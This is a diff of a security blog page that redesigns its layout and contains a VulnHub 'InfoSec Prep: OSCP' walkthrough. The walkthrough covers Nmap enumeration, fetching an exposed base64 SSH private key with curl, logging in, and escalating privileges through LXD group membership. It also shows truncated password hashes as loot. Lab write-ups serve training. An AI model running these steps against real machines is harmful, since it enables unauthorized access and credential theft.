@@ -1,46 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>मंथन | Manthan</title>
-    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
-    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.css"/>
-    <link id="codestylesheet" rel="stylesheet" type="text/css" media="screen" href="/static/css/atelier-forest-light.css">
-    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
-    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-   </head>
-  <body>
-    <div class="body">
-      <div class="menu">
-        <table>
-          <tr>
-            <td colspan="3"><a class="menu_home" href="/index.html">मंथन</a></td>
-          </tr>
-          <tr>
-            <td><a class="menu_archive" href="/archive.html">💾 Archive</a></td>
-            <td><a class="menu_tags" href="/tags.html">🔖 Tags</a></td>
-            <td><a class="menu_stats" href="/stats.html">📊 Stats</a></td>
-            <!--<td>-->
-            <!--  <label class="theme-switch" for="checkbox">-->
-            <!--    <input type="checkbox" id="checkbox" />-->
-            <!--    <div class="slider round"></div>-->
-            <!--  </label>-->
-            <!--</td>-->
-          </tr>
-        </table>
+<html lang="en" data-theme-mode="light">
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="Ankur Tyagi (@7h3rAm)">
+  <meta name="description" content="Personal Weblog">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Manthan</title>
+  <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp">
+  <link rel="stylesheet" href="/static/css/base.css">
+  <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+  <script src="/static/js/theme.js"></script>
+  <script src="/static/js/highlight.min.js"></script>
+  <script src="/static/js/hljs-bash.min.js"></script>
+  <script src="/static/js/hljs-python.min.js"></script>
+  <script src="/static/js/hljs-sql.min.js"></script>
+  <script src="/static/js/hljs-powershell.min.js"></script>
+  <script src="/static/js/hljs-line-numbers.min.js"></script>
+</head>
+<body>
+
+<header>
+  <div>
+    <h1 class="site-title"><a href="/" style="color:inherit;text-decoration:none;">manthan</a></h1>
+    <p class="meta">security research | code | writeups</p>
+  </div>
+</header>
+
+<article id="top">
+  <div class="post-header">
+    <div style="display:flex; justify-content:space-between; align-items:flex-start;">
+      <div>
+        <h1 class="post-title" style="margin:0; cursor:pointer;" onclick="toggleAllSections()">[VulnHub] InfoSec Prep: OSCP</h1>
       </div>
-      <div class="content">
-          <h1 class="h1 title collapsible" onclick="toggle(this);">[VulnHub] InfoSec Prep: OSCP</h1>
-    <div class="title"><code><span class="sparklines"><span style="color:#5b92e5;">▁</span><span style="color:#e83e8c;">▃</span><span style="color:#6f42c1;">▂</span><span style="color:#6f42c1;">▅</span><span style="color:#00bcd4;">▂</span><span style="color:#8357ff;">▅</span><span style="color:#a50b5e;">█</span><span style="color:#4caf50;">▆</span><span style="color:#f44336;">█</span><span style="color:#f44336;">▃</span><span style="color:#e83e8c;">▆</span><span style="color:#99cc99;">█</span><span style="color:#fd7e14;">▆</span><span style="color:#007bff;">▁</span><span style="color:#17a2b8;">▃</span><span style="color:#00b7eb;">▃</span><span style="color:#ffcc66;">▅</span><span style="color:#00bcd4;">▆</span><span style="color:#6610f2;">▃</span><span style="color:#69359c;">▁</span><span style="color:#007bff;">▅</span><span style="color:#f44336;">█</span><span style="color:#6610f2;">▅</span><span style="color:#28a745;">▇</span><span style="color:#dc3545;">▁</span><span style="color:#fd7e14;">▄</span><span style="color:#fd7e14;">▅</span><span style="color:#00bcd4;">▄</span><span style="color:#99cc99;">▇</span><span style="color:#e83e8c;">▃</span><span style="color:#ffc107;">▂</span><span style="color:#00b7eb;">▇</span><span style="color:#00bcd4;">█</span><span style="color:#00bcd4;">▄</span><span style="color:#5b92e5;">▆</span><span style="color:#ffc107;">▇</span><span style="color:#ffcc66;">▅</span><span style="color:#4caf50;">▂</span><span style="color:#8357ff;">▄</span><span style="color:#20b2aa;">▇</span><span style="color:#e83e8c;">▅</span><span style="color:#fe4164;">▂</span><span style="color:#6f42c1;">█</span><span style="color:#20c997;">▁</span><span style="color:#2196f3;">▆</span><span style="color:#fd7e14;">▅</span><span style="color:#ffcc66;">▁</span><span style="color:#20c997;">▇</span><span style="color:#69359c;">▅</span><span style="color:#6c757d;">▃</span><span style="color:#20c997;">▇</span><span style="color:#0c9;">▇</span><span style="color:#17a2b8;">▂</span><span style="color:#20c997;">▁</span><span style="color:#a50b5e;">▁</span><span style="color:#17a2b8;">▁</span><span style="color:#2196f3;">▄</span><span style="color:#f44336;">▂</span><span style="color:#0c9;">▅</span><span style="color:#17a2b8;">▂</span><span style="color:#4caf50;">▃</span><span style="color:#20c997;">▄</span><span style="color:#5b92e5;">▄</span><span style="color:#2196f3;">█</span></span></code></div>
-    <hr>
-          <p style="float:left;"><a href="/posts/20200730_thm-yotf.html"> « </a>📅 published on <code>10/Aug/2020</code><a href="/posts/20201124_htb-buff.html"> » </a></p>
-        <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
-    <div style="clear:both;"></div>
-    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+      <div class="meta" style="text-align:right;">
+        <div>10/Aug/2020</div>
+        <div class="tags"><a href="/tags.html#vulnhub">vulnhub</a>, <a href="/tags.html#writeup">writeup</a></div>
+      </div>
+    </div>
+    <nav class="post-nav" style="margin-top:0.3em;">
+      <a class="nav-prev" href="/posts/20200730_thm-yotf.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">[TryHackMe] Year of the Fox</span></a>      <a class="nav-next" href="/posts/20201124_htb-buff.html"><span class="nav-title">[HackTheBox] Buff</span> <span class="arrow">&gt;&gt;&gt;</span></a>    </nav>
+  </div>
+
+  <div class="content">
+    <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep: OSCP</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_infosecpreposcp/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -48,7 +50,7 @@
 <p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_infosecpreposcp/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested active">1. <code>80/tcp/http/Apache httpd 2.4.41 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys">exploit_ssh_privatekeys</a>, <a href="https://github.com/7h3rAm/writeups#privesc_lxc_bash">privesc_lxc_bash</a>  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested active">1. Here's the Nmap scan result:  </p>
 <pre class="nested active"><code># Nmap 7.80 scan initiated Mon Jul 20 12:03:57 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/xml/_quick_tcp_nmap.xml 192.168.119.198
 Nmap scan report for 192.168.119.198
@@ -98,7 +100,7 @@ http://192.168.119.198/license.txt
 <pre class="nested active"><code>ssh: oscp
 wordpress: admin
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested active">1. We can try to SSH into the machine as user <code>oscp</code> using the SSH private key file. First, we need to set right permissions to the key file and then use it for login:  </p>
 <pre class="nested active"><code>curl http://192.168.119.198/secret.txt | base64 -d - &gt;./sshkey.pvt
 chmod 600 sshkey.pvt
@@ -107,7 +109,7 @@ ssh -i sshkey.pvt oscp@192.168.119.198
 <p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot05.png.webp" />  </p>
 <p class="nested active">2. We successfully login and get interactive access of the machine as user <code>oscp</code>:  </p>
 <p class="nested active"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot06.png.webp" />  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested active"><code>oscp@oscp&gt; id
 uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
 oscp@oscp&gt;  
@@ -137,7 +139,7 @@ oscp@oscp&gt; users
 root
 oscp
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested active">1. From the output of command <code>id</code>, we see that the user <code>oscp</code> is a member of <code>lxd</code> group. We can exploit this misconfiguration to create a dummy container that mounts the local file system and gain access to all privileged files. But we see that the <code>lxc</code> command for this to work is not found in our current environment path:  </p>
 <pre class="nested active"><code>lxc init ubuntu:16.04 test -c security.privileged=true
   -bash: lxc: command not found
@@ -154,12 +156,12 @@ oscp
 <p class="nested active"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot11.png.webp" />  </p>
 <p class="nested active"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot12.png.webp" />  </p>
 <p class="nested active"><img alt="writeup.privesc.steps.2.4" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot13.png.webp" />  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
 <ul class="nested active">
 <li>The SSH key for a user on the target machine was exposed via web application. Although the file was base64 encoded and listed within <code>robots.txt</code>, it doesn't stop an attacker from accessing it.</li>
 <li>The local user was member of the LXD group which allowed to create a privileged container with access to the entire file system. This lead to complete access of files, even those that have been restricted to <code>root</code> user only.</li>
 </ul>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested active"><code>oscp:$6$k8OEgwaFdUqpVETQ$sKlBojI3IYunw8wEDAyoFdHgVtOPzkDPqksql7IWzpfZXpd3UqP569BokTZ52mDroq/rmJY9zgfeQVmB.........................
 root:$6$.wvqHr9ixq/hDW8t$a/dHKimULfr5rJTDlS7uoUanuJB2YUUkh.LWSKF7kTNp4aL8UTlOk2wT8IkAgJ.vDF/ThSIOegsuclEg.........................
@@ -171,42 +173,63 @@ wordpress: admin:$P$Bx9ohXoCVR5lkKtuQbuWuh2........
 <h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
 <pre class="nested active"><code>/mnt/root/root/flag.txt: d73b04b0e696b0945283d...........
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested active">
 <li><a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">https://www.vulnhub.com/entry/infosec-prep-oscp,508/</a>  </li>
 <li><a href="https://reboare.github.io/lxd/lxd-escape.html">https://reboare.github.io/lxd/lxd-escape.html</a>  </li>
 <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation</a>  </li>
 <li><a href="https://medium.com/@falconspy/infosec-prep-oscp-vulnhubwalkthrough-a09519236025">https://medium.com/@falconspy/infosec-prep-oscp-vulnhubwalkthrough-a09519236025</a>  </li>
 </ul>
+  </div>
+
+  <nav class="post-nav" style="margin-top:1em;">
+    <a class="nav-prev" href="/posts/20200730_thm-yotf.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">[TryHackMe] Year of the Fox</span></a>    <a class="nav-next" href="/posts/20201124_htb-buff.html"><span class="nav-title">[HackTheBox] Buff</span> <span class="arrow">&gt;&gt;&gt;</span></a>  </nav>
+</article>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  var content = document.querySelector('.content');
+  if (content) {
+    var headings = content.querySelectorAll('h2,h3,h4,h5,h6');
+    headings.forEach(function(h) {
+      var link = document.createElement('a');
+      link.href = '#top';
+      link.className = 'top-link';
+      link.textContent = ' [^]';
+      link.style.fontSize = '0.8em';
+      link.style.color = 'var(--muted)';
+      h.appendChild(link);
+    });
+  }
+});
+</script>
+
+<footer>
+  <p class="nested active">cc-by-sa-4.0</p>
+</footer>
+
+<aside class="sidebar">
+  <div class="sidebar-content">
+    <h4 class="h4 collapsible" onclick="toggle(this);">navigation</h4>
+    <a href="/">home</a>
+    <a href="/archive.html">archive</a>
+    <a href="/tags.html">tags</a>
+    <a href="/stats.html">stats</a>
     <hr>
-          <p style="float:left;">« <a href="/posts/20200730_thm-yotf.html">[TryHackMe] Year of the Fox</a> «</p>
-      <p style="float:right;">» <a href="/posts/20201124_htb-buff.html">[HackTheBox] Buff</a> »</p>
-          </div>
-      <div><a class="footer" href="https://github.com/7h3rAm/7h3rAm.github.io">  </a></div>
-      <script>hljs.initHighlightingOnLoad();</script>
-      <script>hljs.initLineNumbersOnLoad();</script>
-      <script>
-        function toggle(s){
-          s.classList.toggle("expanded");
-          var t=!1,i=!1,a=!1;
-          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
-          for(var l=s.nextElementSibling;l;){
-            if(t&&l.classList.contains("h2")){
-              l.classList.toggle("active");
-              break
-            }
-            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
-              l.classList.toggle("active");
-              break
-            }
-            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
-              l.classList.toggle("active");
-              break
-            }
-            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-          }
-        }
-      </script>
+    <a href="https://github.com/@7h3rAm">github</a>
+    <a href="https://twitter.com/@7h3rAm">twitter</a>
+    <hr>
+    <h4 class="h4 collapsible" onclick="toggle(this);">toggles</h4>
+    <div class="toggle-group">
+      <button class="toggle-btn toggle-theme" onclick="toggleThemeMode()">◑ theme</button>
+      <button class="toggle-btn toggle-density" onclick="toggleDensity()">▥ density</button>
+      <button class="toggle-btn toggle-width" onclick="toggleWidth()">▱ width</button>
+      <button class="toggle-btn toggle-justify" onclick="toggleJustify()">¶ justify</button>
+      <button class="toggle-btn toggle-collapse" onclick="toggleAllSections()">±</button>
     </div>
-  </body>
+  </div>
+</aside>
+
+<script>hljs.configure({ignoreUnescapedHTML: true}); hljs.highlightAll(); hljs.initLineNumbersOnLoad();</script>
+</body>
 </html>
